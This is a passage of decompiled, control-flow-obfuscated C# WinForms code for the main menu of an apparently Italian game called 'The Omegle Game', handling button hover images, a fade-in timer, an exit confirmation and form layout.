				num = ((int)num2 * -1895567044) ^ 0x2B5F9C14;
				continue;
			case 27u:
				num = ((int)num2 * -748833306) ^ 0x1AE6CA1A;
				continue;
			case 26u:
				num = 1325327294;
				continue;
			case 25u:
			{
				int num5;
				int num6;
				if (!flag3)
				{
					num5 = -885658139;
					num6 = -885658139;
				}
				else
				{
					num5 = -1109289326;
					num6 = -1109289326;
				}
				num = num5 ^ (int)(num2 * 150857713);
				continue;
			}
			case 24u:
				GForm1.smethod_16((Control)(object)PictureBox_1, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_1), float_0));
				num = ((int)num2 * -1186885011) ^ -1595417139;
				continue;
			case 23u:
				flag2 = int_1 == 2;
				num = 491108303;
				continue;
			case 22u:
				goto end_IL_0674;
			case 21u:
				num = (int)(num2 * 1292526399) ^ -2020766415;
				continue;
			case 20u:
				GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
				num = (int)((num2 * 1763311123) ^ 0x644B5C0D);
				continue;
			case 19u:
				bool_0 = true;
				GForm1.smethod_16((Control)(object)this, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg")));
				num = ((int)num2 * -287195273) ^ -2031121465;
				continue;
			case 18u:
				int_0 = 0;
				float_0 = 0.3f;
				num = ((int)num2 * -391441507) ^ -1017364132;
				continue;
			case 17u:
				num = 467502629;
				continue;
			case 16u:
				GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
				num = ((int)num2 * -986043849) ^ 0x6A762F26;
				continue;
			case 15u:
				num = 1385111085;
				continue;
			case 13u:
			{
				ref float reference2 = ref float_0;
				reference2 = (float)((double)reference2 + 0.3);
				num = ((int)num2 * -1413360983) ^ -527945686;
				continue;
			}
			case 12u:
				GForm1.smethod_16((Control)(object)PictureBox_2, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_2), float_0));
				num = (int)((num2 * 1981204580) ^ 0x5D6F9696);
				continue;
			case 11u:
				num = ((int)num2 * -2131839341) ^ 0x621E56A4;
				continue;
			case 10u:
			{
				int num3;
				int num4;
				if (!flag2)
				{
					num3 = -399823942;
					num4 = -399823942;
				}
				else
				{
					num3 = -1521181985;
					num4 = -1521181985;
				}
				num = num3 ^ ((int)num2 * -361924273);
				continue;
			}
			case 9u:
				flag = int_1 == 3;
				num = 1332271214;
				continue;
			case 8u:
				GForm1.smethod_31(Timer_0);
				num = ((int)num2 * -1879009695) ^ -1987624129;
				continue;
			case 7u:
				goto IL_0528;
			case 6u:
				GForm1.smethod_20((object)int_0);
				GForm1.smethod_20((object)float_0);
				GForm1.smethod_20((object)Timer_0);
				GForm1.smethod_19();
				num = ((int)num2 * -659708569) ^ 0x7472697A;
				continue;
			case 5u:
			{
				GForm1.smethod_16((Control)(object)PictureBox_3, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_3), float_0));
				ref float reference = ref float_0;
				reference = (float)((double)reference + 0.3);
				num = (int)(num2 * 452478518) ^ -576107855;
				continue;
			}
			case 4u:
				num = ((int)num2 * -1281048713) ^ 0x5705EF9F;
				continue;
			case 3u:
				GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
				num = (int)((num2 * 1205559682) ^ 0x365CBBA7);
				continue;
			case 2u:
				num = ((int)num2 * -798126419) ^ 0x1DE918E;
				continue;
			case 1u:
				GForm1.smethod_16((Control)(object)PictureBox_4, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_4), float_0));
				num = (int)((num2 * 1841284614) ^ 0x70C84EAE);
				continue;
			case 0u:
				checked
				{
					int_0++;
					num = 348374555;
					continue;
				}
			default:
				return;
			case 34u:
				goto IL_0747;
			case 14u:
				return;
			}
			int num13;
			if (int_1 != 1)
			{
				num = 1663705890;
				num13 = 1663705890;
			}
			else
			{
				num = 1512893629;
				num13 = 1512893629;
			}
			continue;
			IL_0528:
			int num14;
			if (int_1 != 4)
			{
				num = 584786015;
				num14 = 584786015;
			}
			else
			{
				num = 24441460;
				num14 = 24441460;
			}
			continue;
			end_IL_0674:
			break;
		}
		goto IL_036d;
		IL_036d:
		num = 1298456527;
		goto IL_0674;
	}

	private void method_2(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 664369780;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x33470FD3u) % 6u)
				{
				case 5u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_hover.png")));
					num = (int)(num2 * 628956157) ^ -160117528;
					continue;
				case 4u:
					num = ((int)num2 * -364217679) ^ -461740974;
					continue;
				case 3u:
					num = 1147049525;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (bool_0)
					{
						num3 = -830395624;
						num4 = -830395624;
					}
					else
					{
						num3 = -2144498466;
						num4 = -2144498466;
					}
					num = num3 ^ (int)(num2 * 123021868);
					continue;
				}
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1730371432;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF218C3A1u) % 8u)
				{
				case 7u:
					num = ((int)num2 * -1283100638) ^ -9109723;
					continue;
				case 6u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
					num = ((int)num2 * -361592462) ^ 0x54326732;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 964186236;
						num4 = 964186236;
					}
					else
					{
						num3 = 1561474610;
						num4 = 1561474610;
					}
					num = num3 ^ ((int)num2 * -1842178823);
					continue;
				}
				case 2u:
					num = (int)((num2 * 893744827) ^ 0x448708D7);
					continue;
				case 1u:
					flag = bool_0;
					num = (int)((num2 * 522988266) ^ 0x2E394DC6);
					continue;
				case 0u:
					num = -266006091;
					continue;
				default:
					return;
				case 3u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void method_4(object sender, MouseEventArgs e)
	{
		if (bool_0)
		{
			goto IL_0069;
		}
		goto IL_00f1;
		IL_00f1:
		int num = 1128079125;
		goto IL_00bb;
		IL_00bb:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x46A08A7Fu) % 9u)
			{
			case 8u:
				GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_pressed.png")));
				GClass1.smethod_1().method_3();
				num = (int)((num2 * 1983421166) ^ 0x43A80B04);
				continue;
			case 5u:
				num = (int)((num2 * 1473832618) ^ 0x7B7EFF67);
				continue;
			case 4u:
				GForm1.smethod_34((Form)(object)this);
				num = ((int)num2 * -555005059) ^ 0x230D7C1C;
				continue;
			case 3u:
				break;
			case 2u:
				GClass1.smethod_1().method_4();
				bool_1 = true;
				num = ((int)num2 * -1688765396) ^ 0x71DA1276;
				continue;
			case 1u:
				num = (int)(num2 * 1962814907) ^ -1683298109;
				continue;
			case 0u:
				GForm1.smethod_33((Control)(object)Class2.Class3_0.GForm3_0);
				num = (int)((num2 * 1766687340) ^ 0x4A19990);
				continue;
			default:
				return;
			case 7u:
				goto IL_00f1;
			case 6u:
				return;
			}
			break;
		}
		goto IL_0069;
		IL_0069:
		num = 2093697722;
		goto IL_00bb;
	}

	private void method_5(object sender, EventArgs e)
	{
		if (bool_0)
		{
			goto IL_0056;
		}
		goto IL_0084;
		IL_0084:
		int num = -1286191312;
		goto IL_005b;
		IL_005b:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x8D50520Fu) % 6u)
			{
			case 3u:
				GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_hover.png")));
				num = (int)((num2 * 1543832013) ^ 0x276CB133);
				continue;
			case 2u:
				num = ((int)num2 * -119401295) ^ -1650114769;
				continue;
			case 1u:
				num = ((int)num2 * -634572517) ^ 0xE0DDBD2;
				continue;
			case 0u:
				break;
			default:
				return;
			case 4u:
				goto IL_0084;
			case 5u:
				return;
			}
			break;
		}
		goto IL_0056;
		IL_0056:
		num = -168088454;
		goto IL_005b;
	}

	private void method_6(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1696424087;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBB65E50Cu) % 7u)
				{
				case 6u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 2038635163;
						num4 = 2038635163;
					}
					else
					{
						num3 = 597670938;
						num4 = 597670938;
					}
					num = num3 ^ ((int)num2 * -620377266);
					continue;
				}
				case 5u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
					num = (int)((num2 * 1578142892) ^ 0x43EA418D);
					continue;
				case 4u:
					num = -1349603258;
					continue;
				case 3u:
					flag = bool_0;
					num = ((int)num2 * -1886042785) ^ 0x6561B2B2;
					continue;
				case 2u:
					num = ((int)num2 * -422499502) ^ -6194097;
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void method_7(object sender, MouseEventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 11143565;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6D8F0222u) % 9u)
				{
				case 8u:
					bool_1 = true;
					num = (int)(num2 * 942849474) ^ -1949121150;
					continue;
				case 5u:
					num = (int)(num2 * 1721072938) ^ -171876589;
					continue;
				case 4u:
					GForm1.smethod_33((Control)(object)Class2.Class3_0.GForm2_0);
					GForm1.smethod_34((Form)(object)this);
					num = ((int)num2 * -636994503) ^ 0x6D7B0E64;
					continue;
				case 3u:
					num = ((int)num2 * -1900341061) ^ 0x2ED5B29E;
					continue;
				case 2u:
					flag = bool_0;
					num = (int)((num2 * 290445347) ^ 0x3487AA7);
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1813511736;
						num4 = 1813511736;
					}
					else
					{
						num3 = 57991327;
						num4 = 57991327;
					}
					num = num3 ^ (int)(num2 * 232880449);
					continue;
				}
				case 0u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_pressed.png")));
					num = (int)((num2 * 391351488) ^ 0x727AA750);
					continue;
				default:
					return;
				case 7u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void method_8(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1357746675;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x16DBB1C4u) % 7u)
				{
				case 5u:
					num = ((int)num2 * -1573941000) ^ -46875085;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (bool_0)
					{
						num3 = -1918348855;
						num4 = -1918348855;
					}
					else
					{
						num3 = -101327063;
						num4 = -101327063;
					}
					num = num3 ^ (int)(num2 * 1265459249);
					continue;
				}
				case 2u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_hover.png")));
					num = ((int)num2 * -207578484) ^ 0x2650B5AB;
					continue;
				case 1u:
					num = ((int)num2 * -1696147579) ^ 0x41A5A495;
					continue;
				case 0u:
					num = 794825728;
					continue;
				default:
					return;
				case 3u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 471177774;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x26331D23u) % 7u)
				{
				case 6u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
					num = (int)((num2 * 1639902012) ^ 0x56C853A3);
					continue;
				case 4u:
					num = (int)((num2 * 1384851876) ^ 0x500284AC);
					continue;
				case 3u:
					num = 643912653;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 2101797702;
						num4 = 2101797702;
					}
					else
					{
						num3 = 1512389017;
						num4 = 1512389017;
					}
					num = num3 ^ (int)(num2 * 2040973599);
					continue;
				}
				case 1u:
					flag = bool_0;
					num = (int)(num2 * 873372229) ^ -380771959;
					continue;
				default:
					return;
				case 5u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void method_10(object sender, MouseEventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1406423037;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x610295D0u) % 7u)
				{
				case 6u:
					num = (int)((num2 * 1696571513) ^ 0x6F5347FE);
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1743371232;
						num4 = -1743371232;
					}
					else
					{
						num3 = -1303607919;
						num4 = -1303607919;
					}
					num = num3 ^ ((int)num2 * -735442567);
					continue;
				}
				case 2u:
					flag = bool_0;
					num = (int)((num2 * 1422051824) ^ 0x2035AAD8);
					continue;
				case 1u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_pressed.png")));
					num = ((int)num2 * -983763230) ^ -374258252;
					continue;
				case 0u:
					num = (int)((num2 * 1286262383) ^ 0x34298893);
					continue;
				default:
					return;
				case 4u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void method_11(object sender, EventArgs e)
	{
		if (bool_0)
		{
			goto IL_0047;
		}
		goto IL_0071;
		IL_0071:
		int num = 1448048400;
		goto IL_004c;
		IL_004c:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x72F74971u) % 5u)
			{
			case 2u:
				GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_hover.png")));
				num = (int)(num2 * 556486748) ^ -971184721;
				continue;
			case 1u:
				num = ((int)num2 * -322305389) ^ 0x6CE84EA0;
				continue;
			case 0u:
				break;
			default:
				return;
			case 3u:
				goto IL_0071;
			case 4u:
				return;
			}
			break;
		}
		goto IL_0047;
		IL_0047:
		num = 1709989036;
		goto IL_004c;
	}

	private void method_12(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -183477202;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xEE2281B1u) % 6u)
				{
				case 5u:
					num = (int)(num2 * 1377331644) ^ -723079215;
					continue;
				case 4u:
					num = (int)(num2 * 478779080) ^ -115713885;
					continue;
				case 2u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
					num = ((int)num2 * -1085777821) ^ 0xCFD04B8;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!bool_0)
					{
						num3 = -1189559661;
						num4 = -1189559661;
					}
					else
					{
						num3 = -238100217;
						num4 = -238100217;
					}
					num = num3 ^ ((int)num2 * -1549235344);
					continue;
				}
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void method_13(object sender, MouseEventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1260009992;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x49FA63F9u) % 9u)
				{
				case 8u:
					method_14();
					num = ((int)num2 * -1699959548) ^ 0x233E0BB0;
					continue;
				case 7u:
					flag = bool_0;
					num = ((int)num2 * -2090946382) ^ -1202093155;
					continue;
				case 6u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_pressed.png")));
					num = ((int)num2 * -741642055) ^ 0x3250B864;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -525419375;
						num4 = -525419375;
					}
					else
					{
						num3 = -187241483;
						num4 = -187241483;
					}
					num = num3 ^ (int)(num2 * 1136271762);
					continue;
				}
				case 3u:
					num = 1087159641;
					continue;
				case 2u:
					num = ((int)num2 * -2136527633) ^ 0x35E7BE2;
					continue;
				case 1u:
					num = ((int)num2 * -1223501508) ^ -570298855;
					continue;
				default:
					return;
				case 0u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	public void method_14()
	{
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Invalid comparison between Unknown and I4
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1683017587;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8FE45220u) % 26u)
				{
				case 25u:
					GForm1.smethod_20((object)bool_1);
					num = (int)(num2 * 1329445425) ^ -1226668332;
					continue;
				case 24u:
					GForm1.smethod_36(GForm1.smethod_11());
					num = (int)((num2 * 2066126598) ^ 0x1BC2C7C3);
					continue;
				case 23u:
					GForm1.smethod_20((object)Timer_1);
					GForm1.smethod_20((object)bool_0);
					num = (int)(num2 * 280809145) ^ -1348489784;
					continue;
				case 21u:
				{
					int num5;
					int num6;
					if (!flag2)
					{
						num5 = -721015870;
						num6 = -721015870;
					}
					else
					{
						num5 = -1610990933;
						num6 = -1610990933;
					}
					num = num5 ^ ((int)num2 * -1452284606);
					continue;
				}
				case 20u:
					GForm1.smethod_19();
					num = ((int)num2 * -2017552810) ^ -1416376555;
					continue;
				case 19u:
					num = (int)(num2 * 1071848848) ^ -31098588;
					continue;
				case 18u:
					num = ((int)num2 * -2100860789) ^ 0x203FB230;
					continue;
				case 17u:
					num = ((int)num2 * -757985541) ^ 0x5EBEBC14;
					continue;
				case 16u:
					num = (int)(num2 * 2078111927) ^ -703310855;
					continue;
				case 15u:
					num = ((int)num2 * -1874379255) ^ -1341768417;
					continue;
				case 14u:
					num = -1767183736;
					continue;
				case 13u:
					flag = !bool_1;
					num = (int)((num2 * 325488478) ^ 0x32BC343A);
					continue;
				case 12u:
					num = (int)((num2 * 306915331) ^ 0x45E17336);
					continue;
				case 11u:
					num = ((int)num2 * -1214160395) ^ -61363307;
					continue;
				case 10u:
					GForm1.smethod_19();
					num = (int)(num2 * 1461904892) ^ -955477788;
					continue;
				case 9u:
					GForm1.smethod_20((object)bool_0);
					GForm1.smethod_20((object)bool_1);
					num = (int)((num2 * 2117370860) ^ 0x6FEEC5C2);
					continue;
				case 8u:
					flag2 = (int)GForm1.smethod_35("Sei sicuro di voler uscire dal gioco?", "The Omegle Game", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6;
					num = ((int)num2 * -730811147) ^ -1650303233;
					continue;
				case 7u:
					num = ((int)num2 * -1031469036) ^ -1946211688;
					continue;
				case 6u:
					GForm1.smethod_20((object)Timer_1);
					num = (int)((num2 * 123138338) ^ 0x3449CD5D);
					continue;
				case 5u:
					GForm1.smethod_31(Timer_1);
					num = ((int)num2 * -1696237125) ^ -370770172;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 841684988;
						num4 = 841684988;
					}
					else
					{
						num3 = 312884397;
						num4 = 312884397;
					}
					num = num3 ^ (int)(num2 * 1560676555);
					continue;
				}
				case 3u:
					GForm1.smethod_31(Timer_1);
					num = -1607051579;
					continue;
				case 2u:
					num = ((int)num2 * -552137162) ^ -1279812400;
					continue;
				case 1u:
					num = (int)((num2 * 1730237545) ^ 0xED7BC65);
					continue;
				default:
					return;
				case 22u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void method_15(object sender, FormClosingEventArgs e)
	{
		method_14();
		bool flag = default(bool);
		while (true)
		{
			int num = -1854930343;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA7A413A6u) % 8u)
				{
				case 7u:
					num = ((int)num2 * -2068219863) ^ 0x2FF2D0B2;
					continue;
				case 6u:
					num = ((int)num2 * -1881450596) ^ 0x3824AB47;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1860635085;
						num4 = -1860635085;
					}
					else
					{
						num3 = -328557396;
						num4 = -328557396;
					}
					num = num3 ^ (int)(num2 * 1698219586);
					continue;
				}
				case 3u:
					flag = !bool_1;
					num = (int)((num2 * 1153960175) ^ 0x45F2AFBF);
					continue;
				case 2u:
					GForm1.smethod_37((CancelEventArgs)(object)e, bool_3: true);
					num = ((int)num2 * -652251923) ^ 0x6FDBBC4A;
					continue;
				case 1u:
					num = ((int)num2 * -444522197) ^ -916722664;
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void method_16(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1246969219;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x89996854u) % 4u)
				{
				case 1u:
					GForm1.smethod_19();
					num = (int)(num2 * 708642750) ^ -1212241702;
					continue;
				case 0u:
					num = (int)(num2 * 145114866) ^ -1381344153;
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			bool flag = default(bool);
			while (true)
			{
				int num = 90594769;
				while (true)
				{
					uint num2;
					int num3;
					switch ((num2 = (uint)num ^ 0x6A04798Du) % 8u)
					{
					case 7u:
						num = (int)(num2 * 216885359) ^ -1820253876;
						continue;
					case 5u:
						GForm1.smethod_38((IDisposable)icontainer_0);
						num = (int)((num2 * 986962962) ^ 0x2EAF99B0);
						continue;
					case 4u:
						if (disposing)
						{
							num = ((int)num2 * -1823980938) ^ -1897217745;
							continue;
						}
						num3 = 0;
						goto IL_0043;
					case 3u:
					{
						int num4;
						int num5;
						if (flag)
						{
							num4 = 1016960898;
							num5 = 1016960898;
						}
						else
						{
							num4 = 948139967;
							num5 = 948139967;
						}
						num = num4 ^ ((int)num2 * -80584930);
						continue;
					}
					case 2u:
						num3 = ((icontainer_0 != null) ? 1 : 0);
						goto IL_0043;
					case 0u:
						num = 743136388;
						continue;
					default:
						return;
					case 6u:
						break;
					case 1u:
						return;
						IL_0043:
						flag = (byte)num3 != 0;
						num = 1316864702;
						continue;
					}
					break;
				}
			}
		}
		finally
		{
			while (true)
			{
				IL_0100:
				int num6 = 1947846632;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num6 ^ 0x6A04798Du) % 4u)
					{
					case 2u:
						num6 = (int)((num2 * 1404980585) ^ 0x2E4C0EAF);
						continue;
					case 1u:
						((Form)this).Dispose(disposing);
						num6 = ((int)num2 * -1206783452) ^ -877946829;
						continue;
					default:
						goto end_IL_00df;
					case 3u:
						break;
					case 0u:
						goto end_IL_00df;
					}
					goto IL_0100;
					continue;
					end_IL_00df:
					break;
				}
				break;
			}
		}
	}

	[DebuggerStepThrough]
	private void method_17()
	{
		//IL_09d9: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			int num = 1631368232;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5216C2B9u) % 87u)
				{
				case 86u:
					num = (int)(num2 * 184080914) ^ -1162731657;
					continue;
				case 85u:
					GForm1.smethod_61((Form)(object)this, bool_3: false);
					num = (int)((num2 * 1616323394) ^ 0x2057D3C7);
					continue;
				case 84u:
					GForm1.smethod_50(PictureBox_1, bool_3: false);
					num = ((int)num2 * -1289591522) ^ -253926898;
					continue;
				case 83u:
					GForm1.smethod_47((Control)(object)PictureBox_4, "PictureBox5");
					GForm1.smethod_48((Control)(object)PictureBox_4, new Size(213, 59));
					num = ((int)num2 * -892099230) ^ 0x21562598;
					continue;
				case 82u:
					GForm1.smethod_49(PictureBox_3, 3);
					num = ((int)num2 * -1479782093) ^ -1705255421;
					continue;
				case 81u:
					GForm1.smethod_47((Control)(object)PictureBox_0, "PictureBox1");
					num = ((int)num2 * -756857337) ^ -435170634;
					continue;
				case 80u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_3);
					num = ((int)num2 * -346715330) ^ 0x41D1BD3F;
					continue;
				case 79u:
					GForm1.smethod_52((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -729495926) ^ 0x10F2AB89;
					continue;
				case 78u:
					GForm1.smethod_58((Control)(object)this, GForm1.smethod_57("Consolas", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
					num = (int)((num2 * 1515833239) ^ 0x5C2E013D);
					continue;
				case 77u:
					GForm1.smethod_48((Control)(object)PictureBox_1, new Size(303, 65));
					num = ((int)num2 * -2129780411) ^ -489914085;
					continue;
				case 76u:
					GForm1.smethod_48((Control)(object)PictureBox_0, new Size(617, 69));
					num = ((int)num2 * -728511567) ^ 0x25D581BC;
					continue;
				case 75u:
					num = (int)(num2 * 455192991) ^ -1669861064;
					continue;
				case 74u:
					PictureBox_1 = GForm1.smethod_40();
					num = (int)((num2 * 1380386300) ^ 0x75EE4405);
					continue;
				case 73u:
					GForm1.smethod_44((Control)(object)PictureBox_3, Color.Transparent);
					num = (int)(num2 * 1838605353) ^ -95340970;
					continue;
				case 72u:
					GForm1.smethod_43((Control)(object)this);
					num = (int)((num2 * 1617860341) ^ 0x7ACF81C1);
					continue;
				case 70u:
					GForm1.smethod_46((Control)(object)PictureBox_4, new Point(396, 408));
					num = (int)(num2 * 1939721608) ^ -621203270;
					continue;
				case 69u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_1);
					num = (int)(num2 * 1603896190) ^ -30924547;
					continue;
				case 68u:
					GForm1.smethod_32(Timer_1, 1000);
					num = ((int)num2 * -1934605915) ^ -1995703987;
					continue;
				case 67u:
					GForm1.smethod_44((Control)(object)PictureBox_2, Color.Transparent);
					num = (int)((num2 * 72360668) ^ 0x77D625AC);
					continue;
				case 66u:
					num = ((int)num2 * -558601707) ^ -1683481768;
					continue;
				case 65u:
					PictureBox_0 = GForm1.smethod_40();
					num = ((int)num2 * -1035229284) ^ 0x52CB2E64;
					continue;
				case 64u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_4);
					num = ((int)num2 * -1942762645) ^ 0x302471FD;
					continue;
				case 63u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_2);
					num = (int)((num2 * 564224161) ^ 0x4E3261B9);
					continue;
				case 62u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_4);
					num = (int)((num2 * 1925635273) ^ 0x258B2F60);
					continue;
				case 61u:
					num = (int)((num2 * 1916287289) ^ 0x3D980A42);
					continue;
				case 60u:
					num = (int)(num2 * 2027705461) ^ -473286567;
					continue;
				case 59u:
					icontainer_0 = GForm1.smethod_39();
					num = ((int)num2 * -1549187370) ^ -1723462519;
					continue;
				case 58u:
					num = (int)(num2 * 1717889240) ^ -436483531;
					continue;
				case 57u:
					num = (int)((num2 * 893859325) ^ 0x79DC5740);
					continue;
				case 56u:
					PictureBox_3 = GForm1.smethod_40();
					num = (int)(num2 * 1232410719) ^ -261362797;
					continue;
				case 55u:
					GForm1.smethod_50(PictureBox_3, bool_3: false);
					num = ((int)num2 * -111391738) ^ 0x790978B8;
					continue;
				case 53u:
					GForm1.smethod_50(PictureBox_4, bool_3: false);
					num = (int)((num2 * 1481420352) ^ 0xC5CA0E4);
					continue;
				case 52u:
					GForm1.smethod_63((Form)(object)this, (FormStartPosition)1);
					GForm1.smethod_64((Form)(object)this, "The Omegle Game");
					GForm1.smethod_65((ISupportInitialize)PictureBox_0);
					num = ((int)num2 * -1093017035) ^ -1666644142;
					continue;
				case 51u:
					GForm1.smethod_51((ContainerControl)(object)this, new SizeF(10f, 22f));
					num = (int)((num2 * 483354016) ^ 0x71BDFEA2);
					continue;
				case 50u:
					GForm1.smethod_49(PictureBox_0, 0);
					num = (int)((num2 * 1588317713) ^ 0x3EA81EE0);
					continue;
				case 49u:
					GForm1.smethod_46((Control)(object)PictureBox_1, new Point(349, 198));
					GForm1.smethod_47((Control)(object)PictureBox_1, "PictureBox2");
					num = ((int)num2 * -920859068) ^ 0x4F813EB3;
					continue;
				case 48u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_2);
					GForm1.smethod_65((ISupportInitialize)PictureBox_3);
					num = (int)((num2 * 1570713251) ^ 0x638B2B5);
					continue;
				case 47u:
					((Control)this).set_DoubleBuffered(true);
					num = ((int)num2 * -183258416) ^ 0x524FB607;
					continue;
				case 46u:
					GForm1.smethod_44((Control)(object)PictureBox_0, Color.Transparent);
					num = ((int)num2 * -1147673627) ^ 0x413806B6;
					continue;
				case 45u:
					GForm1.smethod_59((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1913050230) ^ 0x6A561C83;
					continue;
				case 44u:
					num = ((int)num2 * -1153390317) ^ -1352061682;
					continue;
				case 43u:
					num = (int)((num2 * 1291707003) ^ 0x6336F239);
					continue;
				case 42u:
					num = ((int)num2 * -724435473) ^ -1715826878;
					continue;
				case 41u:
					num = (int)(num2 * 1063572343) ^ -600575293;
					continue;
				case 40u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_3);
					num = (int)((num2 * 4352363) ^ 0x17FA5B44);
					continue;
				case 39u:
					GForm1.smethod_46((Control)(object)PictureBox_0, new Point(214, 12));
